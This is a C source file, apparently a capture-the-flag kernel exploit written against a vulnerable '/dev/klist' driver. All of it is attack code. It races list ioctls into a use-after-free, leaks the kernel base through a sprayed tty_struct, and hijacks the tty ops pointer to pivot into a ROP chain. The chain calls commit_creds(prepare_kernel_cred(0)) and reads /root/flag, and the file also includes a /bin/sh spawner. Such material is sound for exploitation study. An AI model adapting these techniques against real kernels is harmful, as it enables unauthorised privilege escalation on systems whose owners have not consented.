/* 
 * author: luckasdf0
 * build: diet gcc -static exploit.c utils.c -o exploit -lpthread && gzip -kf exploit && base64 exploit.gz
*/ 
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/mman.h>
//#include "utils.h"

#define IO_LIST_ADD     0x1337
#define IO_LIST_SELECT  0x1338
#define IO_LIST_REMOVE  0x1339
#define IO_LIST_HEAD     0x133a

#define BUF_SIZE 0x2c0-0x18
#define KERN_BASE 0xFFFFFFFF81000000

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long xchg_eax_esp;
unsigned long native_write_cr4; // mov cr4, rdi
unsigned long poprdiret;
unsigned long poprsiret;
unsigned long poprdxret;
unsigned long mov_rax_rbx_ret;
unsigned long iretq;
unsigned long swapgs;
unsigned long push_rax_pop_rbx_pp_ret;
unsigned long test_gadget;

unsigned long sys_open;
unsigned long sys_read;
unsigned long sys_write;

unsigned long rip;

typedef struct _list_add_arg {
    size_t size; void *ptr; } list_add_arg_t;

volatile int fd, race1_start = 0, race1_stop = 0, race2_stop = 0, race2_start = 0, race_success = 0;
volatile unsigned long vuln_id;
unsigned long heap_addr = 0;
unsigned long bin_addr = 0;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

unsigned long user_cs, user_ss, user_rflags;

void get_root_payload();
void exploit();

char *root_flag = "/root/flag";
char get_flag[0x100];

void dump(unsigned char *mem, int len) {
    int i = 0;
    int j = 0;
    int maxlines = len/0x10+1;
    int tmp;

    for (; i < maxlines; i+=0x1) {
        if (i == maxlines-1) {
            tmp = len%0x10;

        } else {
            tmp = 0x10;

        }
        for (; j < tmp; j+=0x1) {
            if (j == 7) {
                printf("%02x        ", *(mem+j+i*0x10));

            } else {
                printf("%02x ", *(mem+j+i*0x10));
            }
        }
        puts("");
        j = 0x0;
    }
}

void init_gadgets() {
    iretq               = 0xffffffff8101fc72-KERN_BASE+bin_addr; swapgs              = 0xffffffff81a00eda-KERN_BASE+bin_addr;
    poprdiret           = 0xffffffff8192584a-KERN_BASE+bin_addr;
    poprsiret           = 0xffffffff8100138c-KERN_BASE+bin_addr;
    poprdxret           = 0xffffffff8103ff27-KERN_BASE+bin_addr;
    //xchg_eax_esp        = 0xffffffff81034c06-KERN_BASE+bin_addr;
    xchg_eax_esp        = 0xffffffff81006805-KERN_BASE+bin_addr;
    native_write_cr4    = 0xffffffff81047ba7-KERN_BASE+bin_addr; // mov cr4, rdi
    push_rax_pop_rbx_pp_ret = 0xffffffff81000704-KERN_BASE+bin_addr; // mov cr4, rdi
    //mov_rax_rbx_ret     = 0xffffffff81003504-KERN_BASE+bin_addr; // mov cr4, rdi
    mov_rax_rbx_ret     = 0xffffffff81090775-KERN_BASE+bin_addr; // mov cr4, rdi
    //test_gadget         = 0xffffffff810001ce-KERN_BASE+bin_addr; // mov cr4, rdi
    test_gadget         = 0xffffffff810001ce - KERN_BASE+bin_addr; // mov cr4, rdi

    commit_creds                  = (void *)(0xffffffff810745f0-KERN_BASE+bin_addr);
    prepare_kernel_cred    = (void *)(0xffffffff81074950-KERN_BASE+bin_addr);
    sys_open = 0xffffffff811991c0-KERN_BASE+bin_addr;
    sys_read = 0xffffffff8119b9d0-KERN_BASE+bin_addr;
    sys_write = 0xffffffff8119ba60-KERN_BASE+bin_addr;

    rip = xchg_eax_esp;
}

static void save_state()
{
    asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "pushfq\n"
            "popq %2\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
            :
            : "memory"
       );

}

void get_root_payload(void)
{
        commit_creds(prepare_kernel_cred(0));

}

void get_shell()
{
    printf("is system?\n");
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}

void prepare_rop(void) {
    unsigned long lower_addr = xchg_eax_esp & 0xFFFFFFFF;
    unsigned long base = lower_addr & ~0xFFF;
    if ((unsigned long)mmap((void *)base, 0x80000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base) {
        perror("mmap");
        exit(1);
    }

    save_state();

    unsigned long rop_chain[]= {
        //0xdeadbeef,
        poprdiret,
        0x0,
        prepare_kernel_cred,
        push_rax_pop_rbx_pp_ret,
        0xdeadbeef,
        0xdeadbeef,
        test_gadget,
        mov_rax_rbx_ret,
        0xdeadbeef,
        commit_creds,
        poprdiret,
        root_flag,
        poprsiret,
        2,
        poprdxret,
        0,
        sys_open,
        poprdiret,
        8,
        poprsiret,
        get_flag,
        poprdxret,
        0x80,
        sys_read,
        poprdiret,
        1,
        poprsiret,
        get_flag,
        poprdxret,
        0x80,
        sys_write,
        poprsiret,
        get_flag,
        poprdxret,
        0x80,
        sys_write,
        poprsiret,
        get_flag,
        poprdxret,
        0x80,
        sys_write,
        poprsiret,
        get_flag,
        poprdxret,
        0x80,
        sys_write,
        poprsiret,
        get_flag,
        poprdxret,
        0x80,
        sys_write,

    };

    memcpy((void *)lower_addr, rop_chain, sizeof(rop_chain));
}

void list_add (size_t size, void *ptr) {
    int ret;

    list_add_arg_t *arg = (list_add_arg_t *)malloc(sizeof(list_add_arg_t));
    arg->size = size;
    arg->ptr = ptr;

    ret = ioctl(fd, IO_LIST_ADD, arg);
    if (ret < 0) {
        perror("list_add");
        exit(-1);
    }

    free(arg);
}

void list_head(void *ptr) {
    int ret;
    ret = ioctl(fd, IO_LIST_HEAD, ptr);

    if (ret < 0) {
        perror("list_head");
        exit(-1);
    }
}

void list_remove(int idx) {
    int ret;
    ret = ioctl(fd, IO_LIST_REMOVE, idx);
if (ret < 0) {
        perror("list_remove");
        exit(-1);
    }
}

void list_select(int idx) {
    int ret;
    ret = ioctl(fd, IO_LIST_SELECT, idx);

    if (ret < 0) {
        perror("list_select");
        //exit(-1);
    }
}

void *race1(void *arg) {
    char *buf = (char *)malloc(BUF_SIZE+0x18);

    while (!race_success) {
        //race1_start = 1;
        //while (!race2_start);

        // race start
        pthread_mutex_lock(&mutex);
        list_head(buf);
        pthread_mutex_unlock(&mutex);

        // race stop

        //puts("race1 stop");
        //race1_stop = 1;
        //while (!race2_stop);

    }

    return NULL;
}

void *race2(void *arg) {
    unsigned int usage;
    char *buf = (char *)malloc(BUF_SIZE);
    char *check_buf = (char *)malloc(BUF_SIZE+0x18);
    memset(buf, 'C', BUF_SIZE);
    memset(check_buf, 0, BUF_SIZE);

    while (!race_success) {
        // race start
        list_remove(0);
        // race stop

        pthread_mutex_lock(&mutex);
        list_head(check_buf);
        usage = *(unsigned int *)check_buf;

        if (usage > 10 || usage < 0) {
            //if (usage != 2) {
            dump(check_buf, BUF_SIZE);
            puts("You win the race");
            race_success = 1;

            pthread_mutex_unlock(&mutex);
            return NULL;
        }

        list_add(BUF_SIZE, buf);
        pthread_mutex_unlock(&mutex);
    }

    return NULL;
}


void getshell() {

    int tty_fd, ret;

    int tmp;

    tty_fd = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    if (tty_fd < 0) {
        perror("open tty");
        exit(-1);
    }

    ioctl(tty_fd, 0, 0);

    char leak_buf[BUF_SIZE+0x18];

    list_select(1);
    read(fd, leak_buf, 0x90);
    bin_addr = *(unsigned long *)leak_buf-0x101c9bb;

    printf("kernel binary %p\n", (void *)bin_addr);
    init_gadgets();
    prepare_rop();

    // vtable
    //*(unsigned long *)(leak_buf+0x88) = 0xdeadbeefdeadbeef;
    *(unsigned long *)(leak_buf+0x88) = &rip-1;
    ret = write(fd, leak_buf, 0x90);
    if (ret < 0) {
        perror("write tty driver");
    }

    char *buf = (char *)malloc(0x90);
    memset(buf, 'A', 0x90);
    list_add(0x90, buf);
    list_select(0);

    scanf("%d", &tmp);

    tty_fd = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    ioctl(tty_fd, 0, 0);

    //unsigned long fops_ptr = 0xdeadbeefdeadbeef;

    //ret = write(fd, &fops_ptr, 8);
    //if (ret <= 0) {
    //    perror("write tty fops");
    //    exit(-1);
    //}
}

void exploit() {
    int ret;

    // step 1 : open a new file
    fd = open("/dev/klist", O_RDWR);


    // step 2 : add a new item 0
    char *buf = (char *)malloc(BUF_SIZE);
    memset(buf, 'A', BUF_SIZE);
    list_add(BUF_SIZE, buf); //0

    // add anoter item 1
    buf = (char *)malloc(BUF_SIZE);
    memset(buf, 'B', BUF_SIZE);
    list_add(BUF_SIZE, buf); //1

    // leak addr of item 0
    char *read_buf = (char *)malloc(BUF_SIZE+0x18);
    list_head(read_buf);
    heap_addr = *(unsigned long *)(read_buf+0x10);
    printf("heap %p\n", (void *)heap_addr);

    //list_remove(0);
    // step 4 :  race condition between ADD_ITEM and LIST_HEAD
    pthread_t t1, t2;

    pthread_create(&t1, NULL, race1, NULL);
    pthread_create(&t2, NULL, race2, NULL);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    scanf("%d", &ret);
    memset(buf, 'B', BUF_SIZE);
    list_add(BUF_SIZE, buf);

    unsigned long idx = 0;
    while (1) {
        list_add(BUF_SIZE, buf);
        list_head(read_buf);
        if (*(unsigned long *)(read_buf+0x10) == heap_addr) {
            break;
        }
        idx++;
        //list_remove(0);
    }
    //dump(read_buf, BUF_SIZE);
    puts("find u");

    list_remove(0);
    list_head(read_buf);
    //dump(read_buf, BUF_SIZE);

    printf("0 and %d\n", idx);

    list_remove(idx+1);

    getshell();
}

int main(void) {
    exploit();

    while (1) {

    }
    return 0;
}
